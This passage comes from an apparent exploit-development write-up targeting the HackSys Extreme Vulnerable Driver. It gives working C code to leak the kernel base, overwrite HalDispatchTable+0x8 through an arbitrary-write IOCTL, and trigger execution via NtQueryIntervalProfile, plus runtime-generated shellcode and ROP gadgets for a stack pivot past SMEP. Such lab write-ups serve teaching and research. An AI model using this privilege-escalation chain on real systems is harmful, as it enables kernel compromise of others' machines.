<p><img src="/images/Pasted%20image%2020230710062915.png" alt="" /></p>

<p>By tracing back the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">KeQueryIntervalProfile</span> function, we can see it gets called from <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">NtQueryIntervalProfile</span>.</p>

<p><img src="/images/Pasted%20image%2020230710062438.png" alt="" /></p>

<p><span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">NtQueryIntervalProfile</span> is a function we are able to call from a <strong>userland</strong> process. Thus, if we overwrite <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">HalDispatchTable+0x8</span> and call <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">NtQueryIntervalProfile</span>, it will eventually end up calling our overwritten value.</p>

<p><strong>note</strong>: The ntdll <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">NtQueryIntervalProfile</span> is different from the ntoskrnl <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">NtQueryIntervalProfile</span>. The ntdll <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">NtQueryIntervalProfile</span> function uses a <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">syscall</span> to make the jump into the <strong>kernel</strong>.</p>

<p>In order to overwrite <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">HalDispatchTable+0x8</span>, we first retrieve the kernel base address.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">void</span> <span class="p">(</span><span class="o">*</span><span class="n">NtQueryIntervalProfile_t</span><span class="p">)(</span><span class="kt">int</span> <span class="n">arg1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">arg2</span><span class="p">);</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">SYSTEM_MODULE</span> <span class="p">{</span>
	<span class="n">ULONG</span>                <span class="n">Reserved1</span><span class="p">;</span>
	<span class="n">ULONG</span>                <span class="n">Reserved2</span><span class="p">;</span>
<span class="cp">#ifdef _WIN64
</span>	<span class="n">ULONG</span>				<span class="n">Reserved3</span><span class="p">;</span>
<span class="cp">#endif
</span>	<span class="n">PVOID</span>                <span class="n">ImageBaseAddress</span><span class="p">;</span>
	<span class="n">ULONG</span>                <span class="n">ImageSize</span><span class="p">;</span>
	<span class="n">ULONG</span>                <span class="n">Flags</span><span class="p">;</span>
	<span class="n">WORD</span>                 <span class="n">Id</span><span class="p">;</span>
	<span class="n">WORD</span>                 <span class="n">Rank</span><span class="p">;</span>
	<span class="n">WORD</span>                 <span class="n">w018</span><span class="p">;</span>
	<span class="n">WORD</span>                 <span class="n">NameOffset</span><span class="p">;</span>
	<span class="n">CHAR</span>                 <span class="n">Name</span><span class="p">[</span><span class="n">MAXIMUM_FILENAME_LENGTH</span><span class="p">];</span>
<span class="p">}</span><span class="n">SYSTEM_MODULE</span><span class="p">,</span> <span class="o">*</span> <span class="n">PSYSTEM_MODULE</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="n">SYSTEM_MODULE_INFORMATION</span> <span class="p">{</span>
	<span class="n">ULONG</span>                <span class="n">ModulesCount</span><span class="p">;</span>
	<span class="n">SYSTEM_MODULE</span>        <span class="n">Modules</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE_INFORMATION</span><span class="p">,</span> <span class="o">*</span> <span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_SYSTEM_INFORMATION_CLASS</span> <span class="p">{</span>
	<span class="n">SystemModuleInformation</span> <span class="o">=</span> <span class="mi">11</span>
<span class="p">}</span> <span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">PNtQuerySystemInformation</span><span class="p">)(</span>
	<span class="n">__in</span> <span class="n">SYSTEM_INFORMATION_CLASS</span> <span class="n">SystemInformationClass</span><span class="p">,</span>
	<span class="n">__inout</span> <span class="n">PVOID</span> <span class="n">SystemInformation</span><span class="p">,</span>
	<span class="n">__in</span> <span class="n">ULONG</span> <span class="n">SystemInformationLength</span><span class="p">,</span>
	<span class="n">__out_opt</span> <span class="n">PULONG</span> <span class="n">ReturnLength</span>
	<span class="p">);</span>

<span class="n">PVOID</span> <span class="nf">GetKernelBase</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Getting the kernel base address"</span><span class="p">);</span>
	<span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"ntdll"</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ntdll</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to get a handle to ntdll</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">PNtQuerySystemInformation</span> <span class="n">query</span> <span class="o">=</span> <span class="p">(</span><span class="n">PNtQuerySystemInformation</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtQuerySystemInformation"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">query</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to get the NtQuerySystemInformation address</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">ULONG</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">query</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>

	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">pModuleInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">)</span><span class="n">GlobalAlloc</span><span class="p">(</span><span class="n">GMEM_ZEROINIT</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pModuleInfo</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to get the PSYSTEM_MODULE_INFORMATION.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="n">query</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="n">pModuleInfo</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">!=</span> <span class="p">(</span><span class="n">NTSTATUS</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"NtQuerySystemInformation failed with error code 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] ntoskrnl: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pModuleInfo</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ImageBaseAddress</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">pModuleInfo</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ImageBaseAddress</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Using this base address, we can retrieve the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">HalDispatchTable</span> by adding the static offset.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PVOID</span> <span class="nf">GetHalDispatchTable</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">KernelBase</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Getting the HalDispatchTable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x00c00a60</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] HalDispatchTable: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">HalDispatchTable</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Eventually we can get the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">HaliQuerySystemInformation</span> address by adding the 0x8 offset (this step is kind of irrelevant but has been seperated for clarity).</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PVOID</span> <span class="nf">GetHaliQuerySystemInformation</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">HalDispatchTable</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Getting the HaliQuerySystemInformation address</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">PVOID</span> <span class="n">HaliQuerySystemInformation</span> <span class="o">=</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">HalDispatchTable</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] HaliQuerySystemInformation: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HaliQuerySystemInformation</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">HaliQuerySystemInformation</span><span class="p">;</span>
</code></pre></div></div>

<p>We now have enough to overwrite the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">HaliQuerySystemInformation</span> function. However, due to SMEP, we can’t overwrite this function with a <strong>userland</strong> buffer pointer without triggering a BSOD. Instead, we can overwrite this value with any <strong>kernel</strong> address that is executable. A common technique to use if we had control over the stack contents would be ROP, though we are only able to overwrite a single function pointer.</p>

<p>What if we can take control over the stack using a single ROP gadget?</p>

<h2 id="taking-control-over-the-stack">Taking control over the stack</h2>
<h3 id="the-plan">The plan</h3>
<p>We figured out we are able to overwrite a function pointer with a valid kernel address in order to execute code. However, we are limited to a single gadget that has to give us control over the stack in order for us to continue our ROP chain. By overwriting indirectly callable kernel functions (such as <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">nt!HaliQuerySystemInformation</span>) that allow for arguments to be passed through, we might be able to find the right gadget that allows us to swap out an argument with the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RSP</span> register.</p>

<h3 id="lay-of-the-land">Lay of the land</h3>
<p>Before we can start looking for gadgets we have to figure out how much control we have over the registers when jumping to the overwritten <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">HalDispatchTable+0x8</span> pointer. In order to do so, we can simply overwrite it with a gadget containing an <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">INT3</span> instruction. This allows us to quickly break once our gadget hits.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">WriteWhereWhat</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hFile</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">WriteWhere</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">WriteWhat</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">PWRITE_WHAT_WHERE</span> <span class="n">WriteWhatWhere</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">BytesReturned</span><span class="p">;</span>

	<span class="n">WriteWhatWhere</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWRITE_WHAT_WHERE</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span>
		<span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span>
		<span class="k">sizeof</span><span class="p">(</span><span class="n">WRITE_WHAT_WHERE</span><span class="p">));</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteWhatWhere</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed To Allocate Memory: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Memory Allocated: 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">WriteWhatWhere</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="n">WriteWhatWhere</span><span class="o">-&gt;</span><span class="n">What</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="o">&amp;</span><span class="n">WriteWhat</span><span class="p">;</span>
	<span class="n">WriteWhatWhere</span><span class="o">-&gt;</span><span class="n">Where</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="n">WriteWhere</span><span class="p">;</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] WriteWhereWhat(%p, %p, %p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">hFile</span><span class="p">,</span> <span class="n">WriteWhere</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">WriteWhat</span><span class="p">);</span>

	<span class="kt">int</span> <span class="n">IOStatus</span> <span class="o">=</span> <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span>
		<span class="n">HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE</span><span class="p">,</span>
		<span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">WriteWhatWhere</span><span class="p">,</span>
		<span class="k">sizeof</span><span class="p">(</span><span class="n">WRITE_WHAT_WHERE</span><span class="p">),</span>
		<span class="nb">NULL</span><span class="p">,</span>
		<span class="mi">0</span><span class="p">,</span>
		<span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span>
		<span class="nb">NULL</span><span class="p">);</span>

	<span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">WriteWhatWhere</span><span class="p">);</span>
	<span class="n">WriteWhatWhere</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>



<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">LPCSTR</span> <span class="n">FileName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCSTR</span><span class="p">)</span><span class="n">DEVICE_NAME</span><span class="p">;</span>

	<span class="c1">// Get the kernel base address</span>
	<span class="n">PVOID</span> <span class="n">KernelBase</span> <span class="o">=</span> <span class="n">GetKernelBase</span><span class="p">();</span>

	<span class="c1">// Get the HalDispatchTable address</span>
	<span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">GetHalDispatchTable</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">);</span>

	<span class="c1">// Get the HaliQuerySystemInformationAddress address</span>
	<span class="n">PVOID</span> <span class="n">HaliQuerySystemInformationAddress</span> <span class="o">=</span> <span class="n">GetHaliQuerySystemInformation</span><span class="p">(</span><span class="n">HalDispatchTable</span><span class="p">);</span>


	<span class="kr">__try</span> <span class="p">{</span>
		<span class="c1">// Get the device handle</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Getting Device Driver Handle</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Device Name: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">FileName</span><span class="p">);</span>

		<span class="n">hFile</span> <span class="o">=</span> <span class="n">GetDeviceHandle</span><span class="p">(</span><span class="n">FileName</span><span class="p">);</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t\t</span><span class="s">[-] Failed Getting Device Handle: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
			<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">else</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\t\t</span><span class="s">[+] Device Handle: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">hFile</span><span class="p">);</span>
		<span class="p">}</span>

		<span class="n">WriteWhereWhat</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HaliQuerySystemInformationAddress</span><span class="p">,</span> <span class="n">AddPtrOffset</span><span class="p">(</span><span class="n">KernelBase</span><span class="p">,</span> <span class="mh">0x5bee0c</span><span class="p">));</span> <span class="c1">// int3; ret; (1 found)</span>

		<span class="k">typedef</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">PtrNtQueryIntervalProfile</span><span class="p">)(</span><span class="n">PVOID</span> <span class="n">arg0</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">arg1</span><span class="p">);</span>

		<span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"ntdll"</span><span class="p">));</span>
		<span class="n">PtrNtQueryIntervalProfile</span> <span class="n">_NtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">PtrNtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to get address of NtQueryIntervalProfile.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
			<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="n">ULONG</span> <span class="n">whatever</span><span class="p">;</span>
		<span class="n">_NtQueryIntervalProfile</span><span class="p">(</span><span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="mh">0x4242424242424242</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="kr">__except</span> <span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Exception: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Executing the above code, we can see that it successfully triggers the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">INT3</span> instruction and breaks into our debugger. However, it does not seem like we have any direct control over registers.</p>

<p><img src="/images/Pasted%20image%2020230710201135.png" alt="" /></p>

<p>We can break on <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">NtQueryIntervalProfile</span> to verify this.</p>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bp nt!NtQueryIntervalProfile
</code></pre></div></div>

<p><img src="/images/Pasted%20image%2020230710201047.png" alt="" /></p>

<p>It appears our arguments do make it into the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">NtQueryIntervalProfile</span> function. Further analyzing the function tells us multiple things, it tells us that our second argument <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RDX</span> is copied into <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RBX</span> before both <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RCX</span> and <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RDX</span> are overwritten, as well as that the reason our arguments did not make it into the overwritten <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">INT3</span> gadget is because an access violation is triggered (causing the exception handler to take over). The <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">INT3</span> instruction we encountered was another process calling <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">NtQueryIntervalProfile</span>.</p>

<p><img src="/images/Pasted%20image%2020230710201531.png" alt="" /></p>

<p>Due to the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">cmovb</span> (Conditional mov if below) instruction, this code will fail if our second argument does not point to a readable <strong>userland</strong> buffer. In order to fix this, we can simply allocate some memory.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PVOID</span> <span class="n">UserlandBuffer</span> <span class="o">=</span> <span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="n">UserlandBuffer</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Failed to allocate UserlandBuffer"</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">_NtQueryIntervalProfile</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">UserlandBuffer</span><span class="p">);</span>
</code></pre></div></div>

<p>Running our exploit once again, we can see we now have control over the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RBX</span> register.</p>

<p><img src="/images/Pasted%20image%2020230710204233.png" alt="" /></p>

<p>With direct control over the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RBX</span> register, we can look for gadgets that would allow us to transfer <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RBX</span> into <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RSP</span>. We can generate a list of gadgets using <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">rp++</span></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./rp-lin -f ntoskrnl.exe --va 0 -r 5 &gt; rop.txt
</code></pre></div></div>

<p>Looking through the list, we find the following gadget.</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x434f8d: push qword[rbx]; jmp qword[rsi + 0x39]; (1 found)
</code></pre></div></div>

<p>Because this gadget ends with a <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">JMP</span>, we can chain an extra gadget if we use some custom dynamically generated shellcode in order to manually set and preserve <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">RSI</span> before the funciton call.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">SetRSI</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">BufferLocation</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] SetRSI(%p)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">BufferLocation</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\xBE</span><span class="s">"</span><span class="p">;</span>
    <span class="n">append</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">(</span><span class="n">CHAR</span><span class="p">)((</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">));</span>
    <span class="n">append</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">(</span><span class="n">CHAR</span><span class="p">)(((</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">&amp;</span> <span class="mh">0xff00</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x100</span><span class="p">));</span>
    <span class="n">append</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">(</span><span class="n">CHAR</span><span class="p">)(((</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">&amp;</span> <span class="mh">0xff0000</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10000</span><span class="p">));</span>
    <span class="n">append</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">(</span><span class="n">CHAR</span><span class="p">)(((</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x1000000</span><span class="p">));</span>
    <span class="n">append</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">(</span><span class="n">CHAR</span><span class="p">)(((</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">&amp;</span> <span class="mh">0xff00000000</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x100000000</span><span class="p">));</span>
    <span class="n">append</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">(</span><span class="n">CHAR</span><span class="p">)(((</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">&amp;</span> <span class="mh">0xff0000000000</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10000000000</span><span class="p">));</span>
    <span class="n">append</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">(</span><span class="n">CHAR</span><span class="p">)(((</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">&amp;</span> <span class="mh">0xff000000000000</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x1000000000000</span><span class="p">));</span>
    <span class="n">append</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="p">(</span><span class="n">CHAR</span><span class="p">)(((</span><span class="n">SIZE_T</span><span class="p">)</span><span class="n">BufferLocation</span> <span class="o">&amp;</span> <span class="mh">0xff00000000000000</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x100000000000000</span><span class="p">));</span>
    <span class="n">append</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="sc">'\xC3'</span><span class="p">);</span>
    <span class="kt">void</span><span class="o">*</span> <span class="n">exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">code</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">code</span><span class="p">);</span>
    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec</span><span class="p">)();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] RSI should be set"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>By placing a <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">POP RSP</span> gadget at the <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">[RSI+39]</span> location, we effectively create a <span style="color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px">PUSH [RBX], POP RSP</span> chain, which allows us to set RSP to the value located in our controllable buffer. This ends up giving us control over the stack!</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x5b784e: pop rsp; ret; (1 found)
</code></pre></div></div>

